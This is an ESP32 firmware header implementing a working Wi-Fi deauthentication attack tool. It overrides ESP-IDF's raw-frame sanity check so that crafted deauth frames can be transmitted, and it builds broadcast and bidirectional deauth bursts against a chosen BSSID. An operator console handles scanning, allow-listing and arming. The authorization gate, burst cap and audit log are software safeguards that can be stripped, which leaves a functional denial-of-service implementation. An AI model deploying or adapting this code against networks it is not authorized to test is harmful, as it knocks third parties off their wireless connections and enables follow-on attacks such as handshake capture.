#pragma once

// Imperative shell for the ESP32 active-offense path: a gated 802.11 deauthentication
// injector plus the operator console that drives it. Compiled into every ESP32 build (like
// the Linux desktop target), it is gated entirely at RUNTIME — the radio stays silent until
// the operator arms + allow-lists a specific BSSID at the serial `sec` console.
//
// Every transmit flows through the same portable, unit-tested authorization gate the Linux
// desktop uses (core/include/zd/secops.hpp + secops_hal.hpp):
//
//   requestDeauth() -> authorize(auth, bssid) -> injector.deauth() only if Allowed
//
// The gate starts DISARMED (operatorConfirmed=false) with an EMPTY allow-list, so even with
// the feature compiled in, the radio stays silent until the operator, at the serial console,
//   1. runs `sec scan`   to discover nearby BSSIDs + channels,
//   2. runs `sec allow <bssid>`  to allow-list a specific target they are authorized to test,
//   3. runs `sec arm I-HAVE-AUTHORIZATION`  to confirm authorization, then
//   4. runs `sec deauth <bssid>` to transmit.
// There is deliberately NO wildcard / "attack-all" command and NOTHING in loop() ever
// injects: offense is strictly operator-initiated and every attempt is audit-logged (Serial
// + a durable NVS counter). Use only against networks you own or are explicitly authorized
// to assess; unauthorized deauthentication is illegal in most jurisdictions.

#include <Arduino.h>
#include <Preferences.h>
#include <WiFi.h>
#include <esp_wifi.h>

#include <cstdint>
#include <string>
#include <vector>

#include "zd/secops.hpp"
#include "zd/secops_hal.hpp"
#include "zd/dot11.hpp"

// --- ESP-IDF raw-frame sanity-check override ----------------------------------------------
//
// Current ESP-IDF rejects crafted management frames from esp_wifi_80211_tx() via an internal
// ieee80211_raw_frame_sanity_check(). Wrapping ONLY that single symbol via
// -Wl,--wrap=ieee80211_raw_frame_sanity_check (in platformio.ini) lets crafted deauth frames
// reach the PHY without globally disabling duplicate-symbol linker checks.
extern "C" int __wrap_ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    (void)arg;
    (void)arg2;
    (void)arg3;
    return 0;
}

namespace zd {
namespace esp32_common {

// --- Durable audit sink (Serial + NVS monotonic counters) ---------------------------------
class SerialNvsAuditLog final : public zd::sec::IAuditLog {
public:
    void begin() {
        ready_ = prefs_.begin("zd-sec", /*readOnly=*/false);
        txTotal_ = ready_ ? prefs_.getULong("deauth_tx", 0u) : 0u;
        blkTotal_ = ready_ ? prefs_.getULong("deauth_blk", 0u) : 0u;
    }

    bool record(const std::string& line) override {
        Serial.printf("[SEC-AUDIT] %s\n", line.c_str());
        // Keep durable tallies so a transmit count survives reboots (tamper-evident-ish).
        if (line.rfind("DEAUTH ALLOWED", 0) == 0) {
            ++txTotal_;
            if (ready_) {
                return prefs_.putULong("deauth_tx", txTotal_) > 0u;
            }
            return true;
        }
        if (line.rfind("DEAUTH BLOCKED", 0) == 0) {
            ++blkTotal_;
            if (ready_) {
                (void)prefs_.putULong("deauth_blk", blkTotal_);
            }
        }
        return true;
    }

    unsigned long transmittedTotal() const { return txTotal_; }
    unsigned long blockedTotal() const { return blkTotal_; }

private:
    Preferences prefs_;
    bool ready_ = false;
    unsigned long txTotal_ = 0u;
    unsigned long blkTotal_ = 0u;
};

// --- ESP32 deauthentication injector (implements the portable IInjector contract) ---------
//
// Assumes the SecSession authorization gate has ALREADY cleared the request; SecSession is
// the only intended caller. Sends on channel `channel_`, which the console sets from the
// target BSSID's last-observed channel before each request.
class Esp32Deauthenticator final : public zd::sec::IInjector {
public:
    bool available() const override { return true; }  // radio is always present on these boards

    void setChannel(int channel) {
        if (channel >= 1 && channel <= 14) {
            channel_ = channel;
        }
    }

    zd::sec::InjectResult deauth(const std::string& bssid, const std::string& client,
                                 uint32_t count) override {
        zd::sec::InjectResult res;
        res.decision = zd::sec::AuthDecision::Allowed;  // gate already cleared by SecSession

        uint8_t ap[6];
        if (!zd::dot11::parseMac(zd::sec::normalizeMac(bssid).c_str(), ap)) {
            res.transmitted = false;
            res.detail = "bad BSSID";
            return res;
        }
        uint8_t sta[6];
        const bool broadcast = client.empty() || zd::sec::isBroadcastMac(zd::sec::normalizeMac(client));
        if (broadcast) {
            for (uint8_t& b : sta) b = 0xFF;
        } else if (!zd::dot11::parseMac(zd::sec::normalizeMac(client).c_str(), sta)) {
            res.transmitted = false;
            res.detail = "bad client MAC";
            return res;
        }

        // Park the radio on the target channel for the burst. Promiscuous mode lets us set an
        // arbitrary channel while the STA interface is otherwise idle.
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_channel(static_cast<uint8_t>(channel_), WIFI_SECOND_CHAN_NONE);

        const uint32_t clamped = count > kMaxBurst ? kMaxBurst : count;
        uint8_t frame[zd::dot11::kMgmtDeauthFrameLen];
        int sent = 0;
        for (uint32_t i = 0; i < clamped; ++i) {
            // AP -> station (or broadcast): the deauth every station honors.
            const std::size_t n = zd::dot11::buildDeauthFrame(frame, sta, ap, ap);
            if (esp_wifi_80211_tx(WIFI_IF_STA, frame, static_cast<int>(n), false) == ESP_OK) {
                ++sent;
            }
            // station -> AP (targeted only), mirroring aireplay-ng's bidirectional kick.
            if (!broadcast) {
                const std::size_t m = zd::dot11::buildDeauthFrame(frame, ap, sta, ap);
                esp_wifi_80211_tx(WIFI_IF_STA, frame, static_cast<int>(m), false);
            }
            delay(1);  // let the PHY drain the TX queue between frames
        }

        esp_wifi_set_promiscuous(false);
        WiFi.mode(WIFI_STA);  // restore the passive-scan interface state for the pet loop

        res.transmitted = sent > 0;
        res.detail = "esp_wifi_80211_tx deauth x" + std::to_string(sent) +
                     " ch" + std::to_string(channel_);
        return res;
    }

    static constexpr uint32_t kMaxBurst = 64u;  // per-command cap; operator can repeat

private:
    int channel_ = 1;
};

// --- Operator console ---------------------------------------------------------------------
//
// Parses `sec ...` serial lines and drives the gate. Self-contained: it runs its own blocking
// discovery scan so target BSSIDs/channels are known, independent of the pet's passive loop.
class OffensiveConsole {
public:
    void begin() {
        audit_.begin();
        // Disable in-memory event-log retention on RAM-constrained ESP32 boards.
        session_.setMaxRecordedEvents(0u);
    }

    // Handle one `sec` command line. Returns text to print to the console.
    std::string handleLine(const std::string& line, uint32_t nowMs) {
        std::vector<std::string> tok = tokenize(line);
        // tok[0] == "sec"; dispatch on tok[1].
        const std::string sub = tok.size() > 1 ? tok[1] : std::string("help");

        if (sub == "help") {
            return help();
        }
        if (sub == "status") {
            return status();
        }
        if (sub == "scan") {
            return scan(nowMs);
        }
        if (sub == "allow" || sub == "deny") {
            if (tok.size() < 3 || !zd::sec::isValidMac(tok[2]) || zd::sec::isMulticastMac(tok[2])) {
                return "usage: sec " + sub + " <unicast-bssid>\n";
            }
            const std::string mac = zd::sec::normalizeMac(tok[2]);
            if (sub == "allow") {
                session_.authorization().allow(mac);
                return "allow-listed " + mac + " (" + std::to_string(
                           session_.authorization().allowedBssids.size()) + " total)\n";
            }
            return session_.authorization().disallow(mac)
                       ? ("removed " + mac + " from allow-list\n")
                       : (mac + " was not on the allow-list\n");
        }
        if (sub == "arm") {
            if (tok.size() < 3 || tok[2] != std::string(kArmToken)) {
                return std::string("Arming authorizes THIS device to transmit deauth frames at\n"
                                   "targets you have explicitly allow-listed. Only do this for\n"
                                   "networks you own or are authorized in writing to assess.\n"
                                   "To confirm: sec arm ") + kArmToken + "\n";
            }
            session_.authorization().operatorConfirmed = true;
            audit_.record("ARM operatorConfirmed=true");
            return "ARMED. Gate still requires each target on the allow-list. `sec disarm` to revert.\n";
        }
        if (sub == "disarm") {
            session_.authorization().operatorConfirmed = false;
            audit_.record("DISARM operatorConfirmed=false");
            return "DISARMED. No transmit will be permitted until re-armed.\n";
        }
        if (sub == "deauth") {
            return deauth(tok, nowMs);
        }
        return "unknown subcommand '" + sub + "'\n" + help();
    }

    const zd::sec::SecSession& session() const { return session_; }

private:
    static constexpr const char* kArmToken = "I-HAVE-AUTHORIZATION";

    static std::vector<std::string> tokenize(const std::string& line) {
        std::vector<std::string> out;
        std::string cur;
        for (char c : line) {
            if (c == ' ' || c == '\t') {
                if (!cur.empty()) {
                    out.push_back(cur);
                    cur.clear();
                }
            } else {
                cur.push_back(c);
            }
        }
        if (!cur.empty()) {
            out.push_back(cur);
        }
        return out;
    }

    static std::string help() {
        return "sec commands (active offense — authorized use only):\n"
               "  sec status                 show arm state, allow-list, counters\n"
               "  sec scan                   discover nearby BSSIDs + channels\n"
               "  sec allow <bssid>          add a BSSID you are authorized to test\n"
               "  sec deny  <bssid>          remove a BSSID from the allow-list\n"
               "  sec arm I-HAVE-AUTHORIZATION  confirm authorization (required to transmit)\n"
               "  sec disarm                 revoke authorization\n"
               "  sec deauth <bssid> [count] transmit deauth (gated; allow-listed + armed)\n";
    }

    std::string status() {
        const zd::sec::Authorization& a = session_.authorization();
        const zd::sec::SecState& s = session_.state();
        std::string out = "sec: ";
        out += a.operatorConfirmed ? "ARMED" : "DISARMED";
        out += " | allow-list: " + std::to_string(a.allowedBssids.size());
        for (const std::string& b : a.allowedBssids) {
            out += "\n    allow " + b;
        }
        out += "\n  targets seen: " + std::to_string(s.targets.size());
        out += " | tx allowed: " + std::to_string(s.allowedInjections);
        out += " | tx blocked: " + std::to_string(s.blockedInjections);
        out += "\n  durable counters: deauth_tx=" + std::to_string(audit_.transmittedTotal()) +
               " deauth_blk=" + std::to_string(audit_.blockedTotal()) + "\n";
        return out;
    }

    // Blocking discovery scan: enumerate BSSID + channel and feed them into the engine so a
    // subsequent `sec deauth` can resolve the target's channel. Passive-pet scanning resumes
    // afterwards (WiFi stays in STA mode).
    std::string scan(uint32_t nowMs) {
        // Clear any active pet-loop async scan cleanly before running a blocking discovery scan.
        WiFi.scanDelete();
        WiFi.mode(WIFI_STA);
        WiFi.disconnect(false, true);
        const int16_t count = WiFi.scanNetworks(/*async=*/false, /*show_hidden=*/true);
        if (count <= 0) {
            WiFi.scanDelete();
            return "scan: no networks found\n";
        }
        std::string out = "scan: " + std::to_string(count) + " networks\n";
        for (int16_t i = 0; i < count; ++i) {
            const std::string bssid = zd::sec::normalizeMac(WiFi.BSSIDstr(i).c_str());
            const int32_t ch = WiFi.channel(i);
            const int32_t rssi = WiFi.RSSI(i);
            const bool enc = WiFi.encryptionType(i) != WIFI_AUTH_OPEN;
            session_.dispatch(zd::sec::ApObserved{
                nowMs, bssid, zd::sec::sanitizePrintableText(std::string(WiFi.SSID(i).c_str()), 32u),
                ch, rssi, enc ? zd::sec::Encryption::Wpa2 : zd::sec::Encryption::Open, false});
            char ln[96];
            snprintf(ln, sizeof(ln), "  %s ch%-3d %4ddBm %s %s\n", bssid.c_str(),
                     static_cast<int>(ch), static_cast<int>(rssi), enc ? "ENC " : "OPEN",
                     zd::sec::sanitizePrintableText(std::string(WiFi.SSID(i).c_str()), 32u).c_str());
            out += ln;
        }
        WiFi.scanDelete();
        return out;
    }

    std::string deauth(const std::vector<std::string>& tok, uint32_t nowMs) {
        if (tok.size() < 3 || !zd::sec::isValidMac(tok[2])) {
            return "usage: sec deauth <bssid> [count]\n";
        }
        const std::string bssid = zd::sec::normalizeMac(tok[2]);
        uint32_t reqCount = 8u;
        if (tok.size() >= 4) {
            const long v = strtol(tok[3].c_str(), nullptr, 10);
            if (v > 0) {
                reqCount = static_cast<uint32_t>(v);
            }
        }
        if (reqCount > Esp32Deauthenticator::kMaxBurst) {
            reqCount = Esp32Deauthenticator::kMaxBurst;
        }

        // Resolve the channel from the last discovery scan; refuse if we have never seen it.
        const zd::sec::WifiTarget* t = zd::sec::findTarget(session_.state(), bssid);
        if (t == nullptr) {
            return "unknown BSSID " + bssid + " — run `sec scan` first\n";
        }
        injector_.setChannel(t->channel);

        // THE chokepoint: gate + (if allowed) transmit, with every attempt audit-logged.
        const zd::sec::InjectResult r =
            session_.requestDeauth(injector_, bssid, /*client=*/"", reqCount, nowMs, &audit_);
        if (r.decision != zd::sec::AuthDecision::Allowed) {
            return std::string("BLOCKED: ") + zd::sec::authDecisionLabel(r.decision) +
                   "\n  (need: sec allow " + bssid + "  then  sec arm " + kArmToken + ")\n";
        }
        return std::string(r.transmitted ? "OK: " : "TX-FAIL: ") + r.detail + "\n";
    }

    zd::sec::SecSession session_;
    Esp32Deauthenticator injector_;
    SerialNvsAuditLog audit_;
};

}  // namespace esp32_common
}  // namespace zd
